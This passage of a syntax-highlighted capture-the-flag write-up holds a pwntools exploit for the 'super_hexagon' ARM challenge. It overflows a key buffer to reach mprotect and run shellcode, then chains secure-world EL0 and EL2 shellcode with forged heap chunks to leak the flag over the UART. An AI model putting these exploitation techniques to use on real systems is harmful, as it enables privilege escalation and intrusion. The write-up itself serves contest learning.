</span></span><span style="display:flex;"><span>sla <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x,y : p<span style="color:#f92672">.</span>sendlineafter(x,y)
</span></span><span style="display:flex;"><span>sa <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x,y : p<span style="color:#f92672">.</span>sendafter(x,y)
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./super_hexagon/share/_bios.bin.extracted/BC010&#39;</span>)
</span></span><span style="display:flex;"><span>ks <span style="color:#f92672">=</span> Ks(KS_ARCH_ARM64,KS_MODE_LITTLE_ENDIAN)
</span></span><span style="display:flex;"><span>sc_st <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffeffffd006</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> bytes(ks<span style="color:#f92672">.</span>asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov x5, #-1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w4, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w3, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xde
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x11, x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w9, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop:                   
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x1, x11, x9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x8, #0x3f
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x0, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x2, #0x1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add w9, w9, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x9, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, x11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x2, #5
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xe2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    blr x11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>)[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> shellcode <span style="color:#f92672">and</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x0a</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> shellcode
</span></span><span style="display:flex;"><span><span style="color:#75715e"># p = remote(&#39;localhost&#39;,6666)</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./local_debug.sh&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># p = process(&#39;./local_debug_secure.sh&#39;)</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x100</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeef</span>) 
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>gets) <span style="color:#75715e"># cmd = 1</span>
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cmd&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, str(<span style="color:#ae81ff">0</span>))
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;key: &#39;</span>, payload)
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0b101</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> shellcode
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cmd&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, str(<span style="color:#ae81ff">0x1000</span>))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0b101</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x100</span> <span style="color:#f92672">-</span> len(payload))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeef</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>mprotect)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(sc_st)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;key: &#39;</span>, payload)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cmd&gt; &#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, str(<span style="color:#ae81ff">1</span>))
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>WORLD_SHARED_MEM_VA <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x023fe000</span>
</span></span><span style="display:flex;"><span>WORLD_SHARED_MEM_PA <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40033000</span>
</span></span><span style="display:flex;"><span>TCI_Data_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4010225c</span>
</span></span><span style="display:flex;"><span>SEL0_shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\xf0\x08\xe8</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># thumb switch</span>
</span></span><span style="display:flex;"><span>SEL0_shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span>
</span></span><span style="display:flex;"><span>SEL0_shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;mov r0, sp&#39;</span>,arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;arm&#39;</span>)
</span></span><span style="display:flex;"><span>SEL0_shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mrc p15, 3, r1, c15, c12, 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mrc p15, 3, r1, c15, c12, 1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0, #0x4]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mrc p15, 3, r1, c15, c12, 2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0, #0x8]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mrc p15, 3, r1, c15, c12, 3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0, #0xc]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mrc p15, 3, r1, c15, c12, 4
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0, #0x10]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mrc p15, 3, r1, c15, c12, 5
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0, #0x14]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mrc p15, 3, r1, c15, c12, 6
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0, #0x18]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mrc p15, 3, r1, c15, c12, 7
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0, #0x1c]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r11, #</span><span style="color:#e6db74">{</span>(WORLD_SHARED_MEM_VA <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> // SHARED MEM
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    lsl r11, r11, #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    orr r11, r11, #</span><span style="color:#e6db74">{</span>WORLD_SHARED_MEM_VA<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> // SHARED MEM
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r0, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    strb r0, [r11]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    add r11, r11, #0xc
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r9, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add r0, sp, r9 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add r1, r11, r9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ldrb r0, [r0]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        strb r0, [r1]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add r9, r9, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp r9, #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc 0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>,arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;arm&#39;</span>)
</span></span><span style="display:flex;"><span>SEL0_shellcode_src <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40035500</span>
</span></span><span style="display:flex;"><span>UART<span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000009000000</span>
</span></span><span style="display:flex;"><span>read_flag <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">65</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">129</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">161</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">193</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">225</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>]
</span></span><span style="display:flex;"><span>TCI_Data <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>TCI_Data <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> 
</span></span><span style="display:flex;"><span>TCI_Data <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x31</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x00000000e4990b0</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x18</span><span style="color:#75715e"># chunk 1</span>
</span></span><span style="display:flex;"><span>TCI_Data <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x31</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x00122c</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x0100060</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x8</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x14</span> <span style="color:#75715e"># chunk 2</span>
</span></span><span style="display:flex;"><span>EL2_shellcode <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    movz x11, #</span><span style="color:#e6db74">{</span>((UART)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((UART)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((UART)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>(UART)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, sp
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>) <span style="color:#f92672">+</span> bytes(read_flag) <span style="color:#f92672">+</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov x9, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x0, sp, x9 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ldrb w0, [x0]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        strb w0, [x11]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x9, x9, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x9, #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x10, #</span><span style="color:#e6db74">{</span>((WORLD_SHARED_MEM_VA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>((WORLD_SHARED_MEM_VA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>((WORLD_SHARED_MEM_VA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>(WORLD_SHARED_MEM_VA)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x9, #</span><span style="color:#e6db74">{</span>((WORLD_SHARED_MEM_PA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x9, #</span><span style="color:#e6db74">{</span>((WORLD_SHARED_MEM_PA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x9, #</span><span style="color:#e6db74">{</span>((WORLD_SHARED_MEM_PA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x9, #</span><span style="color:#e6db74">{</span>(WORLD_SHARED_MEM_PA)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x20, #</span><span style="color:#e6db74">{</span>((SEL0_shellcode_src)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x20, #</span><span style="color:#e6db74">{</span>((SEL0_shellcode_src)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x20, #</span><span style="color:#e6db74">{</span>((SEL0_shellcode_src)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x20, #</span><span style="color:#e6db74">{</span>(SEL0_shellcode_src)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    add x21, x9, #0xc // shellcode_dst, TCI buf payload
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x25, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    alloc_loop:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        // alloc(i, 0x20, b&#39;&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        str w2, [x9] // cmd
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov w2, w25
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        str w2, [x9, #4] // idx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movz w2, #0x0000, lsl 16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movk w2, #0x20, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        str w2, [x9, #8] // sz
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movz x0, #0x8300, lsl 16          
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movk x0, #0x06, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x1, x10
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        smc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x25, x25, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x25, #</span><span style="color:#e6db74">{</span><span style="color:#ae81ff">3</span><span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne alloc_loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x25, #2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    free_loop:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        // free 2, 1, 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        str w2, [x9] // cmd
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov w2, w25
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        str w2, [x9, #4] // idx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movz w2, #0x0000, lsl 16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movk w2, #0x40, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        str w2, [x9, #8] // sz
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movz x0, #0x8300, lsl 16          
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movk x0, #0x06, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x1, x10
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        smc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x25, #</span><span style="color:#e6db74">{</span><span style="color:#ae81ff">0</span><span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        sub x25, x25, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne free_loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    //trigger the vuln
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9] // cmd
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #4] // idx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz w2, #0xffff, lsl 16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk w2, #0xffff, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #8] // sz
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x22, #</span><span style="color:#e6db74">{</span>((TCI_Data_addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x22, #</span><span style="color:#e6db74">{</span>((TCI_Data_addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x22, #</span><span style="color:#e6db74">{</span>((TCI_Data_addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x22, #</span><span style="color:#e6db74">{</span>(TCI_Data_addr)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0x0 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop_tci:                  
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x2, x21, x8 // dst
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x1, x22, x8 // src
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ldrb w0, [x1]
